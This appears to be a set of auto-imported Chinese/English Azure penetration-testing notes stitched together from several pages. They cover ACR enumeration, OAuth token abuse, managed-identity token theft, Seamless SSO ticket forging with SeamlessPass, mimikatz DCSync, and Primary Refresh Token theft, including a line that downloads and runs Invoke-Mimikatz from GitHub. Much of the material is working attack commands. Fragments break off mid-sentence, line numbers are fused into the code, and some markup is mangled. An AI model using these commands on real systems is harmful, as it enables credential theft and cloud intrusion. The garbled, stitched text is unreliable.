Dockerfileaz acr build --image sample/hello-world:v1 --registry mycontainerregistry008 --file Dockerfile .# Runaz acr run --registry mycontainerregistry008 --cmd '$Registry/sample/hello-world:v1' /dev/null # 3. 枚举 1234567891011121314151617181920212223242526272829303132333435# List of all the registries# Check the network, managed identities, adminUserEnabled, softDeletePolicy, url...az acr list# Get the details of a registryaz acr show --name <registry-name># List tokens of a registryaz acr token list --registry <registry-name> --resource-group <res-group># List repositories in a registryaz acr repository list --name <registry-name> --resource-group <res-group># List the tags of a repositoryaz acr repository show-tags --repository <repository-name> --name <registry-name> --resource-group <res-group># List deleted repository tags## At the time of this writing there isn't yet any command to restore itaz acr repository list-deleted --name <registry-name># List tasks## Check the git URL or the commandaz acr task list --registry <registry-name># List tasks runsaz acr task list-runs --registry <registry-name># List connected registriesaz acr connected-registry list --registry <registry-name># List cacheaz acr cache list --registry <registry-name># Get cache detailsaz acr cache show --name <cache-name> --registry <registry-name> # 工具与参考入口 according to the docs docs # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

There are two main types: It’s possible to add VMs manually using a registration keys, or allow Azure to automatically scale the number of hosts without having the option of adding VMs using the registration key. It’s not possible to automatically scale VMs for personal pools. If not, when creating the Host pool it’s possible to indicate the characteristics and the number of VMs you want to create and Azure will create and add them for you. The VM type: This can be “Azure virtual machine” (to use Azure VMs) or “Azure Local virtual machine” which allow hosts to be deployed on-premises or at the edge. It’s possible to set 凭据 to automatically join an AD domain, or use Entra ID directory It’s needed to set an administrator username and 密码 unless Azure will scale the hosts, in that case a secret must be configured with the username and another one with the 密码 It’s possible to configure a script to be executed for custom configuration It’s needed to indicate the path to the binary to execute inside the VM. # 命令 / 载荷 / 操作片段 # 1. 枚举 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748az extension add --name desktopvirtualization# List HostPoolsaz hostsaz rest --method GET --url Microsoft 365 utilizes Azure AD for IAM and is composed of multiple "first-party" OAuth applications. Possess their own 凭据 (e.g., passwords or certificates). Do not have unique 凭据. Security Implication: An attacker can impersonate a public client application when requesting tokens, as there is no mechanism for the 授权 server to verify the legitimacy of the application. If the 凭据 are valid and the flow is allowed, Entra can return access tokens and sometimes refresh tokens that are immediately usable against Microsoft Graph or the target resource. 密码 spraying /credential validation without a corresponding sign-in log in the victim tenant A response difference that reveals whether the 密码 step succeeded No 令牌 issuance, but less telemetry than a normal failed logon 密码 check succeeds The log represents the final transaction state but not the successful 密码 - validation step Access Tokens**😗* The client presents this 令牌 to the resource server to access resources. It can be used only for a specific combination of user, client, and resource and cannot be revoked until expiry：that is 1 hour by default. ID Tokens: The client receives this 令牌 from the 授权 server. It contains basic information about the user. It is bound to a specific combination of user and client. Then query the Azure REST API to get the subscription ID and more . The pages of this section are ordered by Azure service. In there you will be able to find information about the service (how it works and capabilities) and also how to enumerate each service. # 命令 / 载荷 / 操作片段 # 1. Azure API via Powershell 123456789101112131415$Token = 'eyJ0eX..'$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'# $URI = 'https://graph.microsoft.com/v1.0/applications'$RequestParams = @{ Method = 'GET' Uri = $URI Headers = @{ 'Authorization' = "Bearer $Token" }}(Invoke-RestMethod @RequestParams).value# List resources and check for runCommand privileges$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01' # 2. Azure API via Python Version 1234567891011121314IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']IDENTITY_HEADER = os.environ['IDENTITY_HEADER']print("[+] Management API")cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)val = os.popen(cmd).read()print("Access Token: "+json.loads(val)["access_token"])print("ClientID/AccountID: "+json.loads(val)["client_id"])print("\r\n[+] Graph API")cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)val = os.popen(cmd).read()print(json.loads(val)["access_token"])print("ClientID/AccountID: "+json.loads(val)["client_id"]) # 3. Azure API via Python Version 12345678910import logging, osimport azure.functions as funcdef main(req: func.HttpRequest) -> func.HttpResponse: logging.info('Python HTTP trigger function processed a request.') IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] IDENTITY_HEADER = os.environ['IDENTITY_HEADER'] cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() return func.HttpResponse(val, status_code=200) # 工具与参考入口 https://msportals.io/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 Windows 原生工具利用 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It's supported by both PHS (密码 哈希 Sync) and PTA (Pass-through 认证). Desktop SSO is using Kerberos for 认证. When configured, Azure AD Connect creates a **computer account called AZUREADSSOACC∗∗inon−premAD.The密码oftheAZUREADSSOACC** in on-prem AD. The 密码 of the AZUREADSSOACC∗∗inon−premAD.The密码oftheAZUREADSSOACC account is sent as plain-text to Entra ID during the configuration. The Kerberos tickets are encrypted using the NTHash (MD4) of the 密码 and Entra ID is using the sent 密码 to decrypt the tickets. Entra ID exposes an endpoint (https://autologon.microsoftazuread-sso.com) that accepts Kerberos tickets. Domain-joined machine's browser forwards the tickets to this endpoint for SSO. The main thing to know about this attack is that just having the TGT or a specific TGS of a user that is synchronized with Entra ID is enough to access the cloud resources.\ A compromised user's TGS: If you compromise a user's session with the ticket to HTTP/autologon.microsoftazuread-sso.com in memory, you can use it to access the cloud resources. A compromised user’s 哈希 or 密码: SeamlessPass will communicate with the domain controller with this information to generate the TGT and then the TGS. A 黄金票据: If you have the KRBTGT key, you can create the TGT you need for the attacked user. The AZUREADSSOACC$ account 哈希 or 密码: With this info and the user’s Security Identifier (SID) to attack it's possible to create a service ticket an authenticate with the cloud (as performed in the previous method). https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com At the logon screen, the username should be entered, leaving the 密码 field blank. WriteDACL / GenericWrite over AZUREADSSOACC$ A computer account you control (哈希 & 密码)：You could create one # 命令 / 载荷 / 操作片段 # 1. 枚举 12345678910111213# Check if the SSO is enabled in the tenantImport-Module AADInternalsInvoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table# Check if the AZUREADSSOACC$ account exists in the domainInstall-WindowsFeature RSAT-AD-PowerShellImport-Module ActiveDirectoryGet-ADComputer -Filter "SamAccountName -like 'AZUREADSSOACC$'"# Check it using raw LDAP queries without needing an external module$searcher = New-Object System.DirectoryServices.DirectorySearcher$searcher.Filter = "(samAccountName=AZUREADSSOACC`$)"$searcher.FindOne() # 2. SeamlessPass 1234567891011# Using the TGT to access the cloudseamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_encoded_TGT># Using the TGS to access the cloudseamlesspass -tenant corp.com -tgs user_tgs.ccache# Using the victims account hash or password to access the cloudseamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEFseamlesspass -tenant corp.com -domain corp.local -dc 10.0.1.2 -username user -password password# Using the AZUREADSSOACC$ account hash (ntlm or aes) to access the cloud with a specific user SID and domain SIDseamlesspass -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234seamlesspass -tenant corp.com -adssoacc-aes DEADBEEFDEADBEEFDEADBEEFDEADBEEF -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -user-rid 1234wmic useraccount get name,sid # Get the user SIDs # 3. Getting hashes of the AZUREADSSOACC$ account 123456789101112131415# Dump hash using mimikatzInvoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit# Dump hash using https://github.com/MichaelGrafnetter/DSInternalsGet-ADReplAccount -SamAccountName 'A

content: 来源路径： 02-知识点/云与容器/Az：SQL 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：SQL 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：SQL 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：SQL 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Az：SQL、Azure SQL、SQL Server Security Features、Azure SQL Database、SQL Database Security Features；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Az：SQL Azure SQL SQL Server Security Features Azure SQL Database SQL Database Security Features Azure SQL Column Level Security (Masking) & Row Level Security Azure SQL Managed Instance Azure SQL Virtual Machines 枚举 Connect and run SQL queries 权限提升 后渗透 持久化 # 核心要点 Azure SQL is a family of managed, secure, and intelligent products that use the SQL Server database engine in the Azure cloud. This means you don't have to worry about the physical administration of your servers, and you can focus on managing your data. Azure SQL consists of four main offerings: Azure SQL Server: A server is needed for the deployment and management of SQL Server databases. Azure SQL Database: This is a fully-managed database service, which allows you to host individual databases in the Azure cloud. Azure SQL Managed Instance: This is for larger scale, entire SQL Server instance-scoped deployments. Azure SQL Server on Azure VMs: This is best for architectures where you want **control over the operating system **and SQL Server instance. It’s also possible to allow Azure services to access it (like to use the Query editor in the portal or to allow an Azure VM to connect). Both SQL and Microsoft Entra 认证: Traditional SQL 认证 with username and 密码 alongside Microsoft Entra. As always, an Azure managed key is used by default but a customer managed encryption key (CMEK) could also be used. For some examples of the Azure services that can be accessed from the database check this page of the docs Useful for “mitigating potential database vulnerabilities, and detecting anomalous activities” We will talk about Defender in its own lesson (it can be enabled in several other Azure services) Ledger: It cryptographically verifies the integrity of data, ensuring that any tampering is detected. Useful to financial, medical and any organization managing sensitive data. Azure SQL Virtual Machines allows to control the operating system and the SQL Server instance, as a VM will be spawn in the VM service running the SQL server. # 命令 / 载荷 / 操作片段 # 1. SQL Server Security Features 12345678910111213141516171819202122-- Create a credential for the managed identityCREATE DATABASE SCOPED CREDENTIAL [ManagedIdentityCredential]WITH IDENTITY = 'Managed Identity';GO-- Create an external data source pointing to the blob storage to accessCREATE EXTERNAL DATA SOURCE ManagedIdentityWITH ( TYPE = BLOB_STORAGE, LOCATION = 'https://testsqlidentity.blob.core.windows.net/sqlcontainer', CREDENTIAL = ManagedIdentityCredential);GO-- Read a file from ths storage and return itSELECT *FROM OPENROWSET( BULK 'message.txt', DATA_SOURCE = 'ManagedIdentity', SINGLE_CLOB) AS DataFile;GO # How Does a PRT Work? Why are PRTs Powerful? How to know if a PRT is present? Pass the PRT Mimikatz Mimikatz + AADInternals Mimikatz + roadtx Mimikatz + roadrecon Abusing protected PRTs Windows 令牌 Broker Architecture and SSO Flow User-Level 令牌 Theft (Non-Admin) BrowserCore (MicrosoftAccountTokenProvider COM) Web Account Manager (WAM) APIs Administrator / SYSTEM-Level 令牌 Abuse User Impersonation and 令牌 Retrieval Direct LSASS & 令牌 Broker Interaction (Advanced) Phishing PRTs # 核心要点 Unlike typical refresh tokens (which are usually application-specific), a PRT is broader, allowing your device to request tokens for almost any Entra ID-integrated resource or service. When your device (like a Windows laptop or mobile phone) joins or registers with Entra ID, it authenticates using your 凭据 (username / 密码 / MFA). 令牌 Storage: Each time you access an Entra ID-protected application (e.g., Microsoft 365 apps, SharePoint, Teams), your device silently uses the stored PRT to request and obtain a specific access 令牌 for that app. You don't need to enter your 凭据 repeatedly because the PRT transparently handles 认证. Universal Access: Unlike typical tokens limited to one app or resource, a PRT can facilitate access to all Entra ID-integrated services. Enhanced Security: With built-in hardware protections (like TPM), PRTs ensure secure 令牌 storage and usage. Now we can request tokens using the interactive browser with roadtx browserprtauth. If we use the roadtx describe command, we see the access 令牌 includes an MFA claim because the PRT I used in this case also had an MFA claim. RequestAADRefreshToken (Returns an Azure AD refresh 令牌 or PRT cookie) ROADtoken & ROADtools (Lists Azure AD accounts logged in via WAM; identifies 令牌 targets) Generic Example (PowerShell with MSAL): (Silently gets an access 令牌 leveraging PRT) # 命令 / 载荷 / 操作片段 # 1. How to know if a PRT is present? 123# Executedsregcmd /status## Check if the value of AzureAdPrt is set to YES # 2. How to know if a PRT is present? 12345678Get-Tpm | Select TpmPresent,TpmReady,TpmEnabled,TpmOwned# TpmPresent/Ready = True indicates the device can bind secrets to TPM.dsregcmd /status# In Device State / WHfB prerequisites you’ll typically see:# KeyProvider = Microsoft Platform Crypto Provider ⇒ TPM hardware key;# KeyProvider = Software Key Storage Provider ⇒ not TPM‑bound.# Some builds also show TpmProtected: YES/NO and KeySignTest (run elevated to test). # 3. Mimikatz 123456privilege::debugsekurlsa::cloudap# Or in powershelliex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"' # 4. Mimikatz 12345token::elevatedpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect# PowerShell versionInvoke-Mimikatz -Command '"token::elevate" "dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect"' # 5. Mimikatz 1234# Context is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect# Derivedkey is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect# PRT is obtained from sekurlsa::cloudap (filed "Prt"dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT> # 6. Mimikatz + AADInternals 123456789101112131415161718192021# Code from https://aadinternals.com/post/prt/# Add the PRT to a variable$MimikatzPRT = "MS5BVUVCNFdiUV9UZnV2RW13ajlEaFVoR2JCSWM3cWpodG9CZElzblY2TVdtSTJUdENBY1JCQVEuQWdBQkF3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQO...R0RjNFQ0QxaHJ1RFdJeHZUM0stWjJpQVhmMnBLeWpPaHBIOVc"# Add paddingwhile($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}# Convert from Base 64$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))# Add the session key (Clear key) to a variable$MimikatzKey = "7ee0b1f2eccbae440190bf0761bc52099ad7ae7d10d28bd83b67a81a0dfa0808"# Convert to byte array and base 64 encode$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))# Generate a new PRTToken with nonce$prtToken = New-AADIntUserPRTToken -RefreshTo
